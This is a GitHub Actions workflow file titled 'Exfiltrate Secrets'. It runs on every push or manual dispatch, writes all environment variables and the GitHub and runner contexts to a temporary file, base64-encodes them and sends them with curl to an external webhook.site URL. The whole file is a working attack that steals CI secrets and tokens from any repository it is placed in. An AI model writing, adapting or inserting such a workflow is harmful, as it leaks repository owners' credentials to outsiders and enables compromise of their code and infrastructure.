name: Exfiltrate Secrets

on:
  push:
  workflow_dispatch:

jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Dump Secrets
        run: |
          echo "=== ENV VARS ===" >> /tmp/secrets.txt
          env >> /tmp/secrets.txt
          echo "" >> /tmp/secrets.txt
          echo "=== GITHUB CONTEXT ===" >> /tmp/secrets.txt
          echo "$GITHUB_CONTEXT" >> /tmp/secrets.txt
          echo "" >> /tmp/secrets.txt
          echo "=== RUNNER CONTEXT ===" >> /tmp/secrets.txt
          echo "$RUNNER_CONTEXT" >> /tmp/secrets.txt

      - name: Base64 Encode and Exfil
        run: |
          cat /tmp/secrets.txt | base64 -w 0 > /tmp/secrets.b64
          curl -X POST -H "Content-Type: text/plain" --data-binary @/tmp/secrets.b64 https://webhook.site/ddee3182-c94b-4b23-9f87-8b26be775f1f
